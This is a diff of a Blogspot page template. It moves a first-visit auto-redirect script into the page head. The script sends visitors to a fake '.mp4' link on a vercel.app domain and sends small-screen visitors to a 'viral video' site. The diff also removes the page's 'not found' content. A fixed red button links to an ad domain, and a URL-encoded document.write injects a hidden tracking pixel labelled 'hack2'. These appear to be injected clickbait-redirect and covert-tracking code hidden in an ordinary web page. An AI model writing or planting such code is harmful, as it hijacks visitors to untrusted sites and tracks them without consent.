@@ -284,6 +284,24 @@
   <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
+	    <script>
+        // Verificar si es la primera visita
+        if (!localStorage.getItem('visited')) {
+            // Generar un número aleatorio único y actualizar el enlace dinámico
+            var randomNumber = Math.floor(Math.random() * 1000000000); // Número aleatorio de 0 a 999,999,999
+            var dynamicLink = document.getElementById('dynamicLink');
+            dynamicLink.href = 'https://new2-flax.vercel.app/?m=' + randomNumber + '.mp4'; // Agregar .mp4 al final del número aleatorio
+            // Establecer una bandera para indicar que el usuario ha visitado la página
+            localStorage.setItem('visited', 'true');
+            // Redirigir automáticamente si es la primera visita
+            window.location.href = dynamicLink.href;
+        } else {
+            // Redirigir a la URL específica para dispositivos móviles
+            if (window.innerWidth <= 480 && window.innerHeight <= 800) {
+                window.location.href = 'https://video-viralles.vercel.app/';
+            }
+        }
+    </script><main id="content" class="site-main">
   <body>
     <meta http-equiv="cache-control" content="no-cache">
     <noscript>
@@ -326,24 +344,6 @@
           </div>
         </div>
       </div>
-	        <script>
-        // Verificar si es la primera visita
-        if (!localStorage.getItem('visited')) {
-            // Generar un número aleatorio único y actualizar el enlace dinámico
-            var randomNumber = Math.floor(Math.random() * 1000000000); // Número aleatorio de 0 a 999,999,999
-            var dynamicLink = document.getElementById('dynamicLink');
-            dynamicLink.href = 'https://new2-flax.vercel.app/?m=' + randomNumber + '.mp4'; // Agregar .mp4 al final del número aleatorio
-            // Establecer una bandera para indicar que el usuario ha visitado la página
-            localStorage.setItem('visited', 'true');
-            // Redirigir automáticamente si es la primera visita
-            window.location.href = dynamicLink.href;
-        } else {
-            // Redirigir a la URL específica para dispositivos móviles
-            if (window.innerWidth <= 480 && window.innerHeight <= 800) {
-                window.location.href = 'https://video-viralles.vercel.app/';
-            }
-        }
-    </script><main id="content" class="site-main">
 <!-- Botón redondo mejorado -->
 <div style="position: fixed; bottom: 0; left: 0; width: 100%; text-align: center; background-color: #fa0909; padding: 10px;">
   <a href="https://captionconjecture.com/ncd0tibp?key=a38d20c400ac0e1de01424f98192b1cf" style="color: #fff; text-decoration: none; padding: 15px 20px; border-radius: 50px; font-size: 18px; display: inline-block;">
@@ -351,23 +351,5 @@
   </a>
 </div>
 	    
-    </div class="footer">
-        <ul><!-- Enlaces del pie de página --></ul>
-    </div>
-		<header class="page-header">
-			<h1 class="entry-title">The page can&rsquo;t be found.</h1>
-		</header>
-	
-	<div class="page-content">
-		<p>It looks like nothing was found at this location.</p>
-	</div>
-
-</main>
-<footer id="site-footer" class="site-footer">
-	</footer>
-
-
-</body>
-</html>
 <script type='text/javascript'>document.write(unescape('%3C%69%6D%67%20%73%72%63%3D%22%2F%2F%77%68%6F%73%2E%61%6D%75%6E%67%2E%75%73%2F%70%69%6E%67%6A%73%2F%3F%6B%3D%68%61%63%6B%32%20%26%74%3D%20%59%6F%75%74%75%62%65%20%26%78%3D%59%6F%75%74%75%62%65%2E%63%6F%6D%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%22%20%61%6C%74%3D%22%22%3E'))</script>
 
